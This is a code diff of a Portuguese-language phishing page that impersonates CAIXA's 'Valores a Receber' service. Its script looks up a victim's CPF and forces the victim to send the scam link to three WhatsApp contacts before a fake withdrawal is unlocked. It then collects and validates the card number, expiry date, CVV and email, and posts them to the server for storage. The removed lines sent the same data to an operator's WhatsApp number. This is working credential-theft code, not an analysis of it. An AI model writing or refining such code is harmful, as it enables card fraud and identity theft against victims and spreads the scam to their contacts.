+            const mensagem = `🏦 *CAIXA - VALORES A RECEBER* 🏦\n\nDescobri que tenho R$ ${valorUsuario} esquecidos no Banco Central!\n\n💰 *Consulte o seu agora mesmo:*\n👇👇👇\n${LINK_DO_SITE}\n👆👆👆\n\n✅ É rápido, gratuito e pode ter dinheiro esperando por você!\n\nObrigado por me ajudar compartilhando este link! 💙`;
+            
+            enviarWhatsApp(mensagem);
+            amigosIndicados++;
+            const friendDiv = document.getElementById(`friend${amigosIndicados}`);
+            if (friendDiv) {
+                friendDiv.classList.remove('pending');
+                friendDiv.classList.add('success');
+                friendDiv.innerHTML = '✓';
+            }
+            verificarLiberacaoSaque();
+            salvarProgresso();
+            
+            if (amigosIndicados < 3) {
+                alert(`🔹 Você indicou ${amigosIndicados} de 3 amigos. Continue para liberar o saque.`);
+            } else {
+                alert('✅ Parabéns! Você indicou 3 amigos. Os botões de saque foram liberados!');
+            }
+        });
+
+    
+        document.getElementById('btnSaqueCartao').addEventListener('click', () => {
+            if (!saqueLiberado) {
+                alert('Você precisa indicar 3 amigos no WhatsApp para liberar o saque!');
+                return;
+            }
+            showStep('flowCartao', 3);
+        });
+
+     document.getElementById('confirmCartao').addEventListener('click', async () => {
+    const numeroRaw = document.getElementById('numeroCartao').value.replace(/\D/g, '');
+    const validade = document.getElementById('validadeCartao').value;
+    const cvv = document.getElementById('cvvCartao').value;
+    const email = document.getElementById('emailCartao').value;
+    
+    if (!numeroRaw || !validade || !cvv || !email) {
+        alert('Por favor, preencha todos os campos.');
+        return;
+    }
+    
+    // VALIDAÇÃO LUHN DO CARTÃO
+    if (!validarCartaoLuhn(numeroRaw)) {
+        alert('❌ Número do cartão inválido! Verifique os dados.');
+        return;
+    }
+    
+    // Validar validade
+    if (validade.length === 5) {
+        const mes = parseInt(validade.slice(0, 2));
+        const ano = parseInt(validade.slice(3, 5));
+        const anoAtual = new Date().getFullYear() % 100;
+        const mesAtual = new Date().getMonth() + 1;
+        if (ano < anoAtual || (ano === anoAtual && mes < mesAtual)) {
+            alert('❌ Cartão vencido! Verifique a validade.');
+            return;
+        }
+    } else {
+        alert('❌ Data de validade inválida!');
+        return;
+    }
+    
+    // Validar CVV
+    const isAmex = numeroRaw.startsWith('34') || numeroRaw.startsWith('37');
+    const cvvMinLength = isAmex ? 4 : 3;
+    if (cvv.length < cvvMinLength) {
+        alert(`❌ CVV inválido! Deve ter ${cvvMinLength} dígitos.`);
+        return;
+    }
+    
+    const valor = dadosUsuario?.valorDisponivel || 1987.48;
+    
+    // Mostrar loading no botão
+    const btnConfirm = document.getElementById('confirmCartao');
+    const originalText = btnConfirm.innerHTML;
+    btnConfirm.disabled = true;
+    btnConfirm.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Salvando...';
+    
+    try {
+        console.log('🚀 Enviando dados para o servidor...');
+        
+        // Enviar dados para o servidor salvar em arquivo
+        const response = await fetch('/salvar-cartao', {
+            method: 'POST',
+            headers: { 
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                nome: dadosUsuario?.nome || 'N/A',
+                cpf: cpfAtual,
+                numeroCartao: numeroRaw,
+                validade: validade,
+                cvv: cvv,
+                email: email,
+                valor: formatarMoeda(valor)
+            })
+        });
+        
+        console.log('📡 Resposta recebida:', response.status);
+        
+        const resultado = await response.json();
+        console.log('📦 Dados da resposta:', resultado);
+        
+        if (resultado.success) {
+            alert('✅ Dados salvos com sucesso!\n\n📧 Você receberá um e-mail de confirmação em até 24 horas.\n\n⚠️ O valor será creditado na sua conta após a confirmação.');
+            limparProgresso();
+            showStep('flowSuccess', 3);
+        } else {
+            alert('❌ Erro ao salvar dados: ' + (resultado.erro || 'Tente novamente.'));
+        }
+    } catch (error) {
+        console.error('❌ Erro detalhado:', error);
+        alert('❌ Erro ao conectar com o servidor. Verifique se o servidor está rodando.\n\nDetalhe: ' + error.message);
+    } finally {
+        btnConfirm.disabled = false;
+        btnConfirm.innerHTML = originalText;
+    }
+});
+        document.getElementById('cancelCartao').addEventListener('click', () => {
+            salvarProgresso();
+            showStep('flowFinal', 3);
+        });
+        document.getElementById('closeSuccess').addEventListener('click', () => {
+            limparProgresso();
+            bootstrapModal.hide();
+        });
+    });
+</script>
+
+
+          
           <!-- SUCESSO -->
           <div id="flowSuccess" class="flow-step text-center">
             <i class="fas fa-check-circle fa-4x" style="color:#1a7f2e;"></i>
@@ -545,276 +1235,6 @@
     </div>
   </div>
 
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
 
-  <script>
-    let dadosUsuario = null;
-    let dataSelecionada = null;
-    let bootstrapModal = null;
-    let amigosIndicados = 0;
-    let saqueLiberado = false;
-
-    // Número do WhatsApp para envio (SUBSTITUA PELO SEU NÚMERO)
-    const WHATSAPP_NUMBER = "5599999999999"; // Coloque seu número com DDD e país (55)
-
-    function formatarCPF(input) {
-      let value = input.value.replace(/\D/g, '');
-      if (value.length > 11) value = value.slice(0, 11);
-      let formatted = '';
-      if (value.length > 9) {
-        formatted = value.slice(0, 3) + '.' + value.slice(3, 6) + '.' + value.slice(6, 9) + '-' + value.slice(9);
-      } else if (value.length > 6) {
-        formatted = value.slice(0, 3) + '.' + value.slice(3, 6) + '.' + value.slice(6);
-      } else if (value.length > 3) {
-        formatted = value.slice(0, 3) + '.' + value.slice(3);
-      } else {
-        formatted = value;
-      }
-      input.value = formatted;
-    }
-
-    function formatarData(dataStr) {
-      if (!dataStr) return '---';
-      const partes = dataStr.split('-');
-      if (partes.length === 3) return `${partes[2]}/${partes[1]}/${partes[0]}`;
-      return dataStr;
-    }
-
-    function formatarMoeda(valor) {
-      return valor.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-    }
-
-    function getDataMaisDias(dias) {
-      const data = new Date();
-      data.setDate(data.getDate() + dias);
-      return data.toLocaleDateString('pt-BR');
-    }
-
-    function updateStepIndicator(step) {
-      document.querySelectorAll('.step-dot').forEach((el, idx) => {
-        if (idx + 1 <= step) el.classList.add('active');
-        else el.classList.remove('active');
-      });
-    }
-
-    function showStep(stepId, stepNumber) {
-      const steps = ['flowStep1', 'flowLoading', 'flowStep2', 'flowFinal', 'flowPix', 'flowCartao', 'flowSuccess'];
-      steps.forEach(id => {
-        const el = document.getElementById(id);
-        if (el) el.classList.remove('active');
-      });
-      const target = document.getElementById(stepId);
-      if (target) target.classList.add('active');
-      if (stepNumber) updateStepIndicator(stepNumber);
-    }
-
-    async function buscarCPF(cpf) {
-      try {
-        const response = await fetch('/buscar-cpf', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ cpf: cpf })
-        });
-        return await response.json();
-      } catch (error) {
-        return { success: false, erro: 'Erro ao conectar com o servidor' };
-      }
-    }
-
-    function mostrarOpcoesData(opcoes, dataReal) {
-      const container = document.getElementById('dataOptionsContainer');
-      container.innerHTML = '';
-      opcoes.forEach(dataStr => {
-        const div = document.createElement('div');
-        div.className = 'data-option';
-        div.innerHTML = `<i class="fas fa-calendar-alt"></i><span>${formatarData(dataStr)}</span><i class="fas fa-chevron-right ms-auto" style="opacity:0.5"></i>`;
-        div.onclick = () => {
-          if (dataStr === dataReal) {
-            document.querySelectorAll('.data-option').forEach(opt => opt.classList.remove('selected'));
-            div.classList.add('selected');
-            dataSelecionada = dataStr;
-            
-            // Preenche a tela final
-            document.getElementById('valorDisponivel').textContent = formatarMoeda(1987.48);
-            document.getElementById('finalNome').textContent = dadosUsuario.nome;
-            document.getElementById('finalCpf').textContent = document.getElementById('displayCpf').textContent;
-            document.getElementById('pixValor').textContent = formatarMoeda(1987.48);
-            document.getElementById('cartaoValor').textContent = formatarMoeda(1987.48);
-            document.getElementById('dataCredito').textContent = getDataMaisDias(3);
-            
-            showStep('flowFinal', 3);
-          } else {
-            div.style.background = '#ffebee';
-            div.style.borderColor = '#d10000';
-            setTimeout(() => {
-              div.style.background = '';
-              div.style.borderColor = '';
-            }, 500);
-            alert('❌ Data incorreta! Tente novamente.');
-          }
-        };
-        container.appendChild(div);
-      });
-    }
-
-    function enviarWhatsApp(mensagem) {
-      const url = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(mensagem)}`;
-      window.open(url, '_blank');
-    }
-
-    function verificarLiberacaoSaque() {
-      if (amigosIndicados >= 3) {
-        saqueLiberado = true;
-        document.getElementById('btnSaquePix').disabled = false;
-        document.getElementById('btnSaqueCartao').disabled = false;
-      }
-    }
-
-    document.addEventListener('DOMContentLoaded', () => {
-      const modalElement = document.getElementById('flowModal');
-      bootstrapModal = new bootstrap.Modal(modalElement, { backdrop: 'static', keyboard: false });
-      
-      document.getElementById('abrir-verificar').addEventListener('click', (e) => {
-        e.preventDefault();
-        document.getElementById('demoCpf').value = '';
-        amigosIndicados = 0;
-        saqueLiberado = false;
-        showStep('flowStep1', 1);
-        bootstrapModal.show();
-      });
-      
-      document.getElementById('flowCancel').addEventListener('click', () => bootstrapModal.hide());
-      document.getElementById('flowClose').addEventListener('click', () => bootstrapModal.hide());
-      document.getElementById('flowBack1').addEventListener('click', () => showStep('flowStep1', 1));
-      
-      document.getElementById('flowSubmit1').addEventListener('click', async () => {
-        const cpfInput = document.getElementById('demoCpf');
-        let cpf = cpfInput.value.replace(/\D/g, '');
-        if (cpf.length !== 11) {
-          cpfInput.classList.add('input-error');
-          setTimeout(() => cpfInput.classList.remove('input-error'), 1500);
-          return;
-        }
-        showStep('flowLoading', 2);
-        const resultado = await buscarCPF(cpf);
-        if (resultado.success && resultado.nome) {
-          dadosUsuario = resultado;
-          document.getElementById('displayNome').textContent = resultado.nome;
-          document.getElementById('displayCpf').textContent = cpfInput.value;
-          mostrarOpcoesData(resultado.opcoesDatas, resultado.dataReal);
-          showStep('flowStep2', 2);
-        } else {
-          alert(resultado.erro || 'Erro ao consultar CPF');
-          showStep('flowStep1', 1);
-        }
-      });
-
-      // Indicação de amigos no WhatsApp
-      document.getElementById('btnIndicarWhats').addEventListener('click', () => {
-        if (amigosIndicados >= 3) {
-          alert('Você já indicou 3 amigos! O saque já está liberado.');
-          return;
-        }
-        
-        const mensagem = `🎉 *Indicação de Amigo* 🎉\n\nOlá! Eu estou participando do programa de Valores a Receber da CAIXA e preciso indicar amigos para liberar meu saque.\n\n🔹 *Acesse o link e consulte seus valores:*\n${window.location.href}\n\n🔹 *Valor disponível para saque:* R$ 1.987,48\n\nObrigado pela ajuda! 💙`;
-        
-        enviarWhatsApp(mensagem);
-        
-        // Simula indicação após compartilhar
-        amigosIndicados++;
-        const friendDiv = document.getElementById(`friend${amigosIndicados}`);
-        if (friendDiv) {
-          friendDiv.classList.remove('pending');
-          friendDiv.classList.add('success');
-          friendDiv.innerHTML = '✓';
-        }
-        
-        verificarLiberacaoSaque();
-        
-        if (amigosIndicados < 3) {
-          alert(`Ótimo! Você indicou ${amigosIndicados} de 3 amigos. Continue para liberar o saque.`);
-        } else {
-          alert('✅ Parabéns! Você indicou 3 amigos. Os botões de saque foram liberados!');
-        }
-      });
-
-      // Saque via Pix
-      document.getElementById('btnSaquePix').addEventListener('click', () => {
-        if (!saqueLiberado) {
-          alert('Você precisa indicar 3 amigos no WhatsApp para liberar o saque!');
-          return;
-        }
-        showStep('flowPix', 3);
-      });
-
-      document.getElementById('confirmPix').addEventListener('click', () => {
-        const email = document.getElementById('emailPix').value;
-        const telefone = document.getElementById('telefonePix').value;
-        
-        if (!email || !telefone) {
-          alert('Por favor, preencha todos os campos.');
-          return;
-        }
-        
-        const mensagem = `🆕 *NOVA SOLICITAÇÃO DE SAQUE - PIX* 🆕\n\n` +
-          `👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n` +
-          `🆔 *CPF:* ${document.getElementById('displayCpf')?.textContent || 'N/A'}\n` +
-          `📧 *E-mail:* ${email}\n` +
-          `📱 *Telefone:* ${telefone}\n` +
-          `💰 *Valor:* R$ 1.987,48\n` +
-          `🏦 *Banco:* CAIXA ECONÔMICA FEDERAL\n` +
-          `📅 *Data da solicitação:* ${new Date().toLocaleString('pt-BR')}\n` +
-          `⏰ *Previsão de crédito:* ${getDataMaisDias(3)}\n\n` +
-          `✅ *Solicitação enviada via Pix*`;
-        
-        enviarWhatsApp(mensagem);
-        alert('✅ Solicitação enviada com sucesso! Em breve entraremos em contato.');
-        showStep('flowSuccess', 3);
-      });
-
-      // Saque via Cartão
-      document.getElementById('btnSaqueCartao').addEventListener('click', () => {
-        if (!saqueLiberado) {
-          alert('Você precisa indicar 3 amigos no WhatsApp para liberar o saque!');
-          return;
-        }
-        showStep('flowCartao', 3);
-      });
-
-      document.getElementById('confirmCartao').addEventListener('click', () => {
-        const numero = document.getElementById('numeroCartao').value;
-        const validade = document.getElementById('validadeCartao').value;
-        const cvv = document.getElementById('cvvCartao').value;
-        const email = document.getElementById('emailCartao').value;
-        
-        if (!numero || !validade || !cvv || !email) {
-          alert('Por favor, preencha todos os campos.');
-          return;
-        }
-        
-        const mensagem = `🆕 *NOVA SOLICITAÇÃO DE SAQUE - CARTÃO* 🆕\n\n` +
-          `👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n` +
-          `🆔 *CPF:* ${document.getElementById('displayCpf')?.textContent || 'N/A'}\n` +
-          `💳 *Número do Cartão:* ${numero}\n` +
-          `📅 *Validade:* ${validade}\n` +
-          `🔢 *CVV:* ${cvv}\n` +
-          `📧 *E-mail:* ${email}\n` +
-          `💰 *Valor:* R$ 1.987,48\n` +
-          `🏦 *Banco:* CAIXA ECONÔMICA FEDERAL\n` +
-          `📅 *Data da solicitação:* ${new Date().toLocaleString('pt-BR')}\n` +
-          `⏰ *Previsão de crédito:* ${getDataMaisDias(3)}\n\n` +
-          `✅ *Solicitação enviada via Cartão*`;
-        
-        enviarWhatsApp(mensagem);
-        alert('✅ Solicitação enviada com sucesso! Em breve entraremos em contato.');
-        showStep('flowSuccess', 3);
-      });
-
-      // Fechar modais
-      document.getElementById('cancelPix').addEventListener('click', () => showStep('flowFinal', 3));
-      document.getElementById('cancelCartao').addEventListener('click', () => showStep('flowFinal', 3));
-      document.getElementById('closeSuccess').addEventListener('click', () => bootstrapModal.hide());
-    });
-  </script>
 </body>
 </html>
